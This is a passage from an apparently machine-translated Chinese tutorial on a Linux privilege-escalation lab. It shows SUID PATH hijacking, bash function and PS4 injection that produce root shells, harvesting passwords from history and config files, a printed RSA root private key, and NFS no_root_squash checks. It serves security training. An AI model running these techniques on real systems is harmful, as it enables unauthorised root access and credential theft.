+<h4 id="3-我们可以用策略来验证这一点："><a href="#3-我们可以用策略来验证这一点：" class="headerlink" title="3.我们可以用策略来验证这一点："></a>3.我们可以用策略来验证这一点：</h4><pre class="line-numbers language-none"><code class="language-none">strace -v -f -e execve /usr/local/bin/suid-env 2&gt;&amp;1 | grep service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643212.png" alt="image-20210701172526881"></p>
+<pre class="line-numbers language-none"><code class="language-none">user@debian:~$ strace -v -f -e execve /usr/local/bin/suid-env 2&gt;&amp;1 | grep service
+[pid  4721] execve("/bin/sh", ["sh", "-c", "service apache2 start"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=1", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"..., "_=/usr/bin/strace", "OLDPWD=/usr/local/bin"]) = 0
+[pid  4721] execve("/usr/sbin/service", ["service", "apache2", "start"], ["SHELL=/bin/bash", "TERM=xterm-256color", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "USER=user", "HISTFILESIZE=1000000", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "PATH=/usr/local/bin:/usr/bin:/bi"..., "MAIL=/var/mail/user", "_=/usr/sbin/service", "PWD=/home/user", "LANG=en_US.UTF-8", "HOME=/home/user", "SHLVL=2", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"...]) = 0
+[pid  4722] execve("/usr/bin/basename", ["basename", "/usr/sbin/service"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "_=/usr/bin/basename", "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=3", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"...]) = 0
+[pid  4723] execve("/usr/bin/basename", ["basename", "/usr/sbin/service"], ["TERM=xterm-256color", "SHELL/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=3", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"..., "_=/usr/bin/basename"]) = 0
+user@debian:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+<p>可选地，我们也可以用Itrace验证：</p>
+<pre class="line-numbers language-none"><code class="language-none">ltrace /usr/local/bin/suid-env 2&gt;&amp;1 | grep service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643213.png" alt="image-20210701172644492"></p>
+<p>这表明 系统 功能正用于执行 服务 计划。</p>
+<h4 id="4-创建-service-c具有-以下-内容："><a href="#4-创建-service-c具有-以下-内容：" class="headerlink" title="4.创建 service.c具有 以下 内容："></a>4.创建 service.c具有 以下 内容：</h4><pre class="line-numbers language-none"><code class="language-none">int main() 
+{ 
+setuid(0); 
+system("/bin/bash -p"); 
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643214.png" alt="image-20210701172832305"></p>
+<h4 id="5-编译service-c文件："><a href="#5-编译service-c文件：" class="headerlink" title="5.编译service.c文件："></a>5.编译service.c文件：</h4><pre class="line-numbers language-none"><code class="language-none">gcc -o service service.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="6-将当前目录（或可执行新服务的位置）预编到PATH-变量，并执行用于根壳的-SUID-文件："><a href="#6-将当前目录（或可执行新服务的位置）预编到PATH-变量，并执行用于根壳的-SUID-文件：" class="headerlink" title="6.将当前目录（或可执行新服务的位置）预编到PATH 变量，并执行用于根壳的 SUID 文件："></a>6.将当前目录（或可执行新服务的位置）预编到PATH 变量，并执行用于根壳的 SUID 文件：</h4><pre class="line-numbers language-none"><code class="language-none">PATH=.:$PATH /usr/local/bin/suid-env<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643215.png" alt="image-20210701172915956"></p>
+<h2 id="滥用外壳功能"><a href="#滥用外壳功能" class="headerlink" title="滥用外壳功能"></a>滥用外壳功能</h2><h3 id="前言-15"><a href="#前言-15" class="headerlink" title="前言"></a>前言</h3><p>在某些外壳中(特别是 Bash &lt;4.2-048)，可以使用绝对路径名称定义用户功能。<br>这些功能是可以导出，用来方便子处理程序能够访问它们，并且这些函数可以优先于实际可执行的呼叫。</p>
+<h3 id="实操-14"><a href="#实操-14" class="headerlink" title="实操"></a>实操</h3><h4 id="1-在目标上查找SUID-SGID-文件-：-1"><a href="#1-在目标上查找SUID-SGID-文件-：-1" class="headerlink" title="1.在目标上查找SUID/SGID  文件 ："></a>1.在目标上查找SUID/SGID  文件 ：</h4><pre class="line-numbers language-none"><code class="language-none">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643216.png" alt="image-20210701173043064"></p>
+<pre class="line-numbers language-none"><code class="language-none">-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>suid-env</code>文件在root权限下执行</p>
+<h4 id="2-在SUID文件上运行字符串："><a href="#2-在SUID文件上运行字符串：" class="headerlink" title="2.在SUID文件上运行字符串："></a>2.在SUID文件上运行字符串：</h4><pre class="line-numbers language-none"><code class="language-none">strings /usr/local/bin/suid-env2 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643217.png" alt="image-20210701173211516"></p>
+<p>该文件可能正在尝试运行 /usr/sbin/service</p>
+<h4 id="3-我们可以用strace-策略-来验证这一点："><a href="#3-我们可以用strace-策略-来验证这一点：" class="headerlink" title="3.我们可以用strace(策略)来验证这一点："></a>3.我们可以用strace(策略)来验证这一点：</h4><pre class="line-numbers language-none"><code class="language-none">strace -v -f -e execve /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643218.png" alt="image-20210701173504658"></p>
+<pre class="line-numbers language-none"><code class="language-none">user@debian:~$ strace -v -f -e execve /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service
+[pid  4892] execve("/bin/sh", ["sh", "-c", "/usr/sbin/service apache2 start"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "OLDPWD=/usr/local/bin", "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=1", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"..., "_=/usr/bin/strace"]) = 0
+[pid  4892] execve("/usr/sbin/service", ["/usr/sbin/service", "apache2", "start"], ["SHELL=/bin/bash", "TERM=xterm-256color", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "USER=user", "HISTFILESIZE=1000000", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "PATH=/usr/local/bin:/usr/bin:/bi"..., "MAIL=/var/mail/user", "_=/usr/sbin/service", "PWD=/home/user", "LANG=en_US.UTF-8", "HOME=/home/user", "SHLVL=2", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"...]) = 0
+[pid  4893] execve("/usr/bin/basename", ["basename", "/usr/sbin/service"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "_=/usr/bin/basename", "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=3", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"...]) = 0
+[pid  4894] execve("/usr/bin/basename", ["basename", "/usr/sbin/service"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIaENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=3", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"..., "_=/usr/bin/basename"]) = 0a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h4 id="4-可选地，我们也可以用跟踪验证："><a href="#4-可选地，我们也可以用跟踪验证：" class="headerlink" title="4.可选地，我们也可以用跟踪验证："></a>4.可选地，我们也可以用跟踪验证：</h4><pre class="line-numbers language-none"><code class="language-none">ltrace /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643219.png" alt="image-20210701173542883"></p>
+<p>这表明system功能正在用于执行<code>/usr/sbin/service</code>计划</p>
+<h4 id="5-验证-Bash-版本低于-4-2-048："><a href="#5-验证-Bash-版本低于-4-2-048：" class="headerlink" title="5.验证    Bash 版本低于 4.2-048："></a>5.验证    Bash 版本低于 4.2-048：</h4><pre class="line-numbers language-none"><code class="language-none">bash --version <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643220.png" alt="image-20210701173609992"></p>
+<h4 id="6-创建-具有”-usr-sbin-service”名称的-Bash-功能-并导出-该功能："><a href="#6-创建-具有”-usr-sbin-service”名称的-Bash-功能-并导出-该功能：" class="headerlink" title="6.创建 具有”/usr/sbin/service”名称的 Bash 功能 并导出 该功能："></a>6.创建 具有”/usr/sbin/service”名称的 Bash 功能 并导出 该功能：</h4><pre class="line-numbers language-none"><code class="language-none">function /usr/sbin/service { /bin/bash -p; }
+export –f /usr/sbin/service <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<h4 id="7-执行用于根壳的-SUID-文件："><a href="#7-执行用于根壳的-SUID-文件：" class="headerlink" title="7.执行用于根壳的 SUID 文件："></a>7.执行用于根壳的 SUID 文件：</h4><pre class="line-numbers language-none"><code class="language-none">/usr/local/bin/suid-env2 
+root@debian:~# id 
+uid=0(root) gid=0(root) groups=0(root) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="二、滥用外壳功能"><a href="#二、滥用外壳功能" class="headerlink" title="二、滥用外壳功能"></a>二、滥用外壳功能</h2><h3 id="前言-16"><a href="#前言-16" class="headerlink" title="前言"></a>前言</h3><p>Bash具有调试模式，可启用<code>–x</code>命令行选项，或通过修改 SHELLOPTS 环境变量以包括 xtrace启用。<br>默认情况下，SHELLOPTS是只读的，但是env命令允许</p>
+<p>外壳选择待设置<br>在调试模式下，Bash 使用环境变量 PS4 显示调试语句的额外提示。此变量可以包括嵌入式命令，该命令每次显示时都会执行。</p>
+<p>三、总线外壳功能</p>
+<p>如果 SUID 文件通过 Bash 运行其他程序（例如使用system）， 这些环境变量可以继承。<br>如果执行 SUID 文件，此命令将使用文件所有者的权限执行。<br>在 Bash 版本 4.4 及以上中，PS4 环境变量不会由作为root运行的外壳继承。</p>
+<h3 id="实操-15"><a href="#实操-15" class="headerlink" title="实操"></a>实操</h3><h4 id="1-在目标上查找苏伊德-SGID-文件-："><a href="#1-在目标上查找苏伊德-SGID-文件-：" class="headerlink" title="1.在目标上查找苏伊德/SGID 文件 ："></a>1.在目标上查找苏伊德/SGID 文件 ：</h4><pre class="line-numbers language-none"><code class="language-none">$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null 
+
+-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>这个<code>suid-env2</code> 文件在root用户权限下执行</p>
+<h4 id="2-在SUID文件上运行字符串：-1"><a href="#2-在SUID文件上运行字符串：-1" class="headerlink" title="2.在SUID文件上运行字符串："></a>2.在SUID文件上运行字符串：</h4><pre class="line-numbers language-none"><code class="language-none">$ strings /usr/local/bin/suid-env2 
+
+/usr/sbin/service apache2 start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>该文件可能正在尝试运行 <code>/usr/sbin/service</code>程序</p>
+<h4 id="3-我们可以用策略来验证这一点：-1"><a href="#3-我们可以用策略来验证这一点：-1" class="headerlink" title="3.我们可以用策略来验证这一点："></a>3.我们可以用策略来验证这一点：</h4><pre class="line-numbers language-none"><code class="language-none">$ strace -v -f -e execve /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="4-可选地，们也可以用Itrace验证："><a href="#4-可选地，们也可以用Itrace验证：" class="headerlink" title="4.可选地，们也可以用Itrace验证："></a>4.可选地，们也可以用Itrace验证：</h4><pre class="line-numbers language-none"><code class="language-none">$ ltrace /usr/local/bin/suid-env 2&gt;&amp;1 | grep service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这和上一步操作都是一样的 下面开始</p>
+<h4 id="5-运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量："><a href="#5-运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量：" class="headerlink" title="5.运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量："></a>5.运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量：</h4><pre class="line-numbers language-none"><code class="language-none">env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643221.png" alt="image-20210701173845361"></p>
+<h4 id="6-使用-p-命令行选项运行-tmp-rootbash文件以获取root："><a href="#6-使用-p-命令行选项运行-tmp-rootbash文件以获取root：" class="headerlink" title="6.使用 -p 命令行选项运行 /tmp/rootbash文件以获取root："></a>6.使用 -p 命令行选项运行 /tmp/rootbash文件以获取root：</h4><pre class="line-numbers language-none"><code class="language-none">/tmp/rootbash -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643222.png" alt="image-20210701173901466"></p>
+<h1 id="0x10-密码-amp-钥匙"><a href="#0x10-密码-amp-钥匙" class="headerlink" title="0x10 密码 &amp;钥匙"></a>0x10 密码 &amp;钥匙</h1><h2 id="前言-17"><a href="#前言-17" class="headerlink" title="前言"></a>前言</h2><h3 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h3><p>虽然这看起来可能很漫长，但弱密码存储和密码重复使用可能是升级权限的简单方法。</p>
+<p>虽然root用户的帐户密码被隐藏起来，并安全地存储在<code>/etc/shadow</code>中</p>
+<p>但其他密码（如用于服务的密码）可能会 以普通文本存储在配置文件中。</p>
+<p>如果根用户将密码重新用于服务，则可能会找到该密码并用于切换到根用户。</p>
+<h3 id="历史文件"><a href="#历史文件" class="headerlink" title="历史文件"></a>历史文件</h3><p>历史文件记录用户在使用某些程序时发出的命令。<br>如果用户将密码键入命令的一部分，此密码可能会存储在历史记录文件中。<br>尝试使用发现ed 密码切换到根</p>
+<h2 id="实操-16"><a href="#实操-16" class="headerlink" title="实操"></a>实操</h2><h3 id="1-查看用户-home目录中隐藏文件的内容，文件名以”历史记录”结尾："><a href="#1-查看用户-home目录中隐藏文件的内容，文件名以”历史记录”结尾：" class="headerlink" title="1.查看用户/home目录中隐藏文件的内容，文件名以”历史记录”结尾："></a>1.查看用户/home目录中隐藏文件的内容，文件名以”历史记录”结尾：</h3><pre class="line-numbers language-none"><code class="language-none">cat ~/.*history | less<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643223.png" alt="image-20210701180324981"></p>
+<p>两次q退出来</p>
+<p>似乎连接到MySQL服务器的用户 </p>
+<pre class="line-numbers language-none"><code class="language-none">root
+password123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="2-su-登录"><a href="#2-su-登录" class="headerlink" title="2.su 登录"></a>2.su 登录</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643224.png" alt="image-20210701180528720"></p>
+<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="前言-18"><a href="#前言-18" class="headerlink" title="前言"></a>前言</h3><p>许多服务和程序使用配置（配置）文件来存储设置。<br>如果服务需要对某件内容进行身份验证，则可能会将凭据存储在配置文件中。<br>如果这些配置文件是可访问的，并且它们存储的密码被特权用户重复使用，我们也许能够使用它作为该用户登录。</p>
+<h3 id="实操-17"><a href="#实操-17" class="headerlink" title="实操"></a>实操</h3><h4 id="1-列出用户家庭目录的内容："><a href="#1-列出用户家庭目录的内容：" class="headerlink" title="1.列出用户家庭目录的内容："></a>1.列出用户家庭目录的内容：</h4><pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643225.png" alt="image-20210701180706925"></p>
+<h4 id="2-查看myvpn-ovpn-配置文件的内容："><a href="#2-查看myvpn-ovpn-配置文件的内容：" class="headerlink" title="2.查看myvpn.ovpn 配置文件的内容："></a>2.查看myvpn.ovpn 配置文件的内容：</h4><pre class="line-numbers language-none"><code class="language-none">$ cat myvpn.ovpn <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643226.png" alt="image-20210701180741245"></p>
+<p>发现OpenVPN验证用户的纯文本内容</p>
+<h4 id="3-查看文件内容："><a href="#3-查看文件内容：" class="headerlink" title="3.查看文件内容："></a>3.查看文件内容：</h4><pre class="line-numbers language-none"><code class="language-none">cat /etc/openvpn/auth.txt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643227.png" alt="image-20210701180850281"></p>
+<h4 id="4-使用su-登录"><a href="#4-使用su-登录" class="headerlink" title="4.使用su 登录"></a>4.使用su 登录</h4><pre class="line-numbers language-none"><code class="language-none">su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643228.png" alt="image-20210701180920818"></p>
+<h2 id="SSH-密钥"><a href="#SSH-密钥" class="headerlink" title="SSH 密钥"></a>SSH 密钥</h2><h3 id="前言-19"><a href="#前言-19" class="headerlink" title="前言"></a>前言</h3><p>可以使用 SSH 密钥而不是密码来验证使用 SSH 的用户。<br>SSH密钥成对提供：一个私钥和一个公钥。私钥应始终保密。<br>如果用户不安全地存储了其私钥，则任何能够读取密钥的用户都可能能够使用它登录到他们的帐户。</p>
+<h3 id="实操-18"><a href="#实操-18" class="headerlink" title="实操"></a>实操</h3><h4 id="1-root用户的ssh密钥存储在-ssh"><a href="#1-root用户的ssh密钥存储在-ssh" class="headerlink" title="1.root用户的ssh密钥存储在.ssh"></a>1.root用户的ssh密钥存储在<code>.ssh</code></h4><pre class="line-numbers language-none"><code class="language-none">ls -l /.ssh <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643229.png" alt="image-20210701181023210"></p>
+<p>并且文件root_key是可读的</p>
+<h4 id="2-查看root-key文件的内容："><a href="#2-查看root-key文件的内容：" class="headerlink" title="2.查看root_key文件的内容："></a>2.查看root_key文件的内容：</h4><pre class="line-numbers language-none"><code class="language-none">cat /.ssh/root_key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643230.png" alt="image-20210701181321426"></p>
+<h3 id="3-将root-key文件复制到kali并加权以便-SSH-接受它："><a href="#3-将root-key文件复制到kali并加权以便-SSH-接受它：" class="headerlink" title="3.将root_key文件复制到kali并加权以便 SSH 接受它："></a>3.将root_key文件复制到kali并加权以便 SSH 接受它：</h3><p>注意格式问题</p>
+<pre class="line-numbers language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
+gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
+p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
+OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
+eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
+Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
+NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
+YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
+5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
+WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
+VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
+6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
+1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
+824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
+Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
+U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
+Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
+SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
+d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
+jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
+871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
+X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
+CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
+Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
+LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
+-----END RSA PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-none"><code class="language-none">chmod 600 root_key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643231.png" alt="image-20210701181516464"></p>
+<h4 id="4-使用密钥进行连接到-SSH-服务器"><a href="#4-使用密钥进行连接到-SSH-服务器" class="headerlink" title="4.使用密钥进行连接到 SSH 服务器"></a>4.使用密钥进行连接到 SSH 服务器</h4><pre class="line-numbers language-none"><code class="language-none">ssh -i root_key root@192.168.175.228<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643232.png" alt="image-20210701181613497"></p>
+<h1 id="0x11-NFS"><a href="#0x11-NFS" class="headerlink" title="0x11 NFS"></a>0x11 NFS</h1><h2 id="前言-20"><a href="#前言-20" class="headerlink" title="前言"></a>前言</h2><p>NFS（网络文件系统）是一个流行的分布式文件系统。</p>
+<p>NFS共享在<code>/etc/exports</code>文件中配置。<br>远程用户可以安装共享、访问、创建、修改文件。<br>默认情况下，创建的文件会继承remote用户的ID 和组ID(分别作为所有者和组)，即使它们不存在 NFS 服务器上。 </p>
+<h2 id="显示-NFS-服务器的导出列表："><a href="#显示-NFS-服务器的导出列表：" class="headerlink" title="显示 NFS 服务器的导出列表："></a>显示 NFS 服务器的导出列表：</h2><pre class="line-numbers language-none"><code class="language-none">showmount -e &lt;target&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="类似的nmap脚本："><a href="#类似的nmap脚本：" class="headerlink" title="类似的nmap脚本："></a>类似的nmap脚本：</h2><pre class="line-numbers language-none"><code class="language-none">nmap –sV –script=nfs-showmount &lt;target&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="安装-NFS-共享："><a href="#安装-NFS-共享：" class="headerlink" title="安装 NFS 共享："></a>安装 NFS 共享：</h2><pre class="line-numbers language-none"><code class="language-none">mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; &lt;local_directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="Root-Squashing"><a href="#Root-Squashing" class="headerlink" title="Root Squashing"></a>Root Squashing</h2><p>Root Squashing是 NFS如何防止明显的特权升级。<br>如果远程用户是(或声称是)root(uid=0)，NFS将改为”squash”用户，就好像他们是”nobody”用户一样，在”nogroup”组中。<br>虽然此行为是默认的，但它可以禁用！</p>
+<h2 id="no-root-squash"><a href="#no-root-squash" class="headerlink" title="no_root_squash"></a>no_root_squash</h2><p><code>no_root_squash</code>是一个 NFS 配置选项，它关闭root的squash。<br>当包含在可写入的共享配置中时，识别为”root”的远程用户可以作为本地根用户在 NFS 共享上创建文件。</p>
+<h2 id="实操-19"><a href="#实操-19" class="headerlink" title="实操"></a>实操</h2><h3 id="1-检查-etc-exports-的内容，了解具有no-root-squash选项的配置："><a href="#1-检查-etc-exports-的内容，了解具有no-root-squash选项的配置：" class="headerlink" title="1.检查 /etc/exports 的内容，了解具有no_root_squash选项的配置："></a>1.检查 /etc/exports 的内容，了解具有no_root_squash选项的配置：</h3><pre class="line-numbers language-none"><code class="language-none">cat /etc/exports <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643233.png" alt="image-20210701183617720"></p>
+<h3 id="2-确认NFS-共享可用于远程安装："><a href="#2-确认NFS-共享可用于远程安装：" class="headerlink" title="2.确认NFS 共享可用于远程安装："></a>2.确认NFS 共享可用于远程安装：</h3><pre class="line-numbers language-none"><code class="language-none">showmount -e 192.168.1.25 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
